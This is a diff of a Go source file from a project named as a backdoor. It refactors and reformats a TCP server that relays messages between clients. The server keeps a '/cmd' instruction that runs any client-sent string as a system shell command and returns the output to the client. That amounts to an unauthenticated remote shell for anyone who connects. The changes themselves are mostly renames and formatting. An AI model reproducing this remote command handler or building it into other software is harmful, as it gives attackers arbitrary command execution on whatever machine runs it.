@@ -1,48 +1,44 @@
 package server
 
 import (
+	"bytes"
+	"container/list"
 	"fmt"
 	"net"
-	"container/list"
-	"bytes"
-	"strings"
 	"regexp"
-	"github.com/pilebones/backdoorGolang/core/socket"
+	"strings"
+
 	"github.com/pilebones/backdoorGolang/core/cli"
+	"github.com/pilebones/backdoorGolang/core/socket"
 )
 
 const (
 	// Threshold : Limit of simultanous message between client from channel
 	BUFFER_CLIENT_NB_MESSAGE_THRESHOLD = 200
-	// Threshold : Limit of buffer size for socket
+	// Threshold : Limit the buffer size for sockets
 	BUFFER_SIZE = 1024
 )
 
-/** Server structure */
-type ServerProvider struct {
-	target *socket.TargetWrapper
-	UseDebugMode bool
+/** ServerProvider structure */
+type Server struct {
+	socket.SocketContext
 	Clients *list.List
 }
 
 /** Init server instance */
-func Create(target *socket.TargetWrapper, useDebugMode bool) ServerProvider {
-	server := new(ServerProvider)
-	server.target = target
-	server.UseDebugMode = useDebugMode
-	server.Clients = list.New()
-
+func Create(target *socket.Target, useDebugMode bool) Server {
+	server := Server{socket.SocketContext{target, useDebugMode}, list.New()}
 	return *server
 }
 
-func (s ServerProvider) Start() {
+func (s Server) Start() {
 
 	// Pipe between all clients, this pipe relay all message receive from clients to all clients
 	in := make(chan string, BUFFER_CLIENT_NB_MESSAGE_THRESHOLD) // Limit number of simultaneous message with a threshold to avoid server DOS
-	go IOHandler(in, s.Clients) // Init clients channel for message (async management)
+	go IOHandler(in, s.Clients)                                 // Init clients channel for message (async management)
 
 	// Listen on all <host>:<port>
-	serverAddr := fmt.Sprintf("%s:%d", s.target.Host, s.target.Port)
+	serverAddr := fmt.Sprintf("%s:%d", s.Target.Host, s.Target.Port)
 	listener, err := net.Listen("tcp", serverAddr)
 	if err != nil {
 		panic(err.Error())
@@ -61,7 +57,7 @@ func (s ServerProvider) Start() {
 			panic(err.Error())
 		}
 
-		fmt.Print("[SERVER][" + serverAddr + "] Connection receive from ", connection.RemoteAddr(), "\n")
+		fmt.Print("[SERVER]["+serverAddr+"] Connection receive from ", connection.RemoteAddr(), "\n")
 		go ClientHandler(connection, in, s.Clients) // Manage all clients asychronously
 	}
 }
@@ -72,15 +68,15 @@ func (s ServerProvider) Start() {
  * @param Incoming - A pipe between each client to relay message
  * @param clients - A list of connected client
  */
-func IOHandler(Incoming <- chan string, clients *list.List) {
+func IOHandler(Incoming <-chan string, clients *list.List) {
 	for {
 		// fmt.Println("IOHandler : Waiting for input")
 		// Waiting incoming message from a client
-		input := <- Incoming
+		input := <-Incoming
 		// fmt.Println("IOHandler : Handling ", input)
 		for element := clients.Front(); element != nil; element = element.Next() {
 			client := element.Value.(Client)
-			client.Incoming <-input // Notify all clients for this message
+			client.Incoming <- input // Notify all clients for this message
 		}
 	}
 }
@@ -94,8 +90,8 @@ func IOHandler(Incoming <- chan string, clients *list.List) {
  */
 func ClientHandler(connection net.Conn, messageChannel chan string, clients *list.List) {
 	// Create new client instance
-	newClient := & Client{ make(chan string), messageChannel, connection, make(chan bool), clients }
-	go ClientSender(newClient) // Manage sending message
+	newClient := &Client{make(chan string), messageChannel, connection, make(chan bool), clients}
+	go ClientSender(newClient)   // Manage sending message
 	go ClientReceiver(newClient) // Manage receiving message
 	clients.PushBack(*newClient) // Register client to server list of connected clients
 
@@ -106,13 +102,13 @@ func ClientHandler(connection net.Conn, messageChannel chan string, clients *lis
 	for element := clients.Front(); element != nil; element = element.Next() {
 		client := element.Value.(Client)
 		isCurrentUser := client.Connection.RemoteAddr().String() == newClient.Connection.RemoteAddr().String()
-		if (!isCurrentUser) {
+		if !isCurrentUser {
 			// Notify other clients for the new connection
 			client.SendMessage(fmt.Sprintf("Another client as joined the server %s\n", connection.RemoteAddr().String()))
 		}
 
 		message := fmt.Sprintf("- " + client.Connection.RemoteAddr().String())
-		if (isCurrentUser) {
+		if isCurrentUser {
 			message += " (you)"
 		}
 		newClient.SendMessage(message + "\n")
@@ -131,15 +127,15 @@ func ClientSender(client *Client) {
 	clientId := client.Connection.RemoteAddr()
 	for {
 		select {
-			// Standard message receive by the server from a client
-			case buffer := <- client.Incoming:
-				fmt.Println("[SERVER] Sending to ", clientId.String(), ":")
-				client.SendMessage(buffer)
-			// Logout instruction
-			case <- client.Quit:
-				fmt.Println("Client ", clientId.String(), " quitting")
-				client.Connection.Close()
-				break
+		// Standard message receive by the server from a client
+		case buffer := <-client.Incoming:
+			fmt.Println("[SERVER] Sending to ", clientId.String(), ":")
+			client.SendMessage(buffer)
+		// Logout instruction
+		case <-client.Quit:
+			fmt.Println("Client ", clientId.String(), " quitting")
+			client.Connection.Close()
+			break
 
 		}
 	}
@@ -164,15 +160,15 @@ func ClientReceiver(client *Client) {
 		fmt.Printf("ClientReader receiver from %s : \"%s\"\n", client.GetId(), messageTrimmed)
 		bufferTrimmed := bytes.NewBufferString(messageTrimmed).Bytes() // buffer message whithout "\n"
 		if instructionParser(client, bufferTrimmed) {
-			break;
+			break
 		}
 
 		// Sending message to client
 		client.Outgoing <- fmt.Sprintf("[%s] %s\n", client.GetId(), string(bufferTrimmed))
 
 		// Erase all data from buffer
-		for i:= 0; i < BUFFER_SIZE; i++ {
-			buffer[i] = 0x00; // Char End-Line
+		for i := 0; i < BUFFER_SIZE; i++ {
+			buffer[i] = 0x00 // Char End-Line
 		}
 	}
 
@@ -186,13 +182,13 @@ func ClientReceiver(client *Client) {
  * @param buffer - Client input
  */
 func instructionParser(client *Client, buffer []byte) bool {
-	if matched, _ := regexp.Match("^/(quit|exit)$", buffer); matched {  // Logout Instruction
+	if matched, _ := regexp.Match("^/(quit|exit)$", buffer); matched { // Logout Instruction
 		client.Close()
 		return true
 	} else if matched, _ := regexp.Match("^/cmd (.+)", buffer); matched { // Command Instruction
 		r := regexp.MustCompile(`^/cmd (?P<command>.*)`)
 		matches := r.FindStringSubmatch(string(buffer))
-		if (1 < len(matches)) {
+		if 1 < len(matches) {
 			// Handle error if running failed
 			defer func() {
 				if err := recover(); err != nil {
@@ -202,7 +198,7 @@ func instructionParser(client *Client, buffer []byte) bool {
 				}
 			}()
 
-			command := matches[1];
+			command := matches[1]
 			fmt.Printf("[%s] Execute the following system command : %s\n", client.GetId(), command)
 			output := cli.ExecShellScriptOrPanic(command)
 			client.SendMessage(output)
@@ -213,8 +209,6 @@ func instructionParser(client *Client, buffer []byte) bool {
 
 	return false
 }
-
-
 
 /**
  * Remove from buffer empty data (zero bytes)
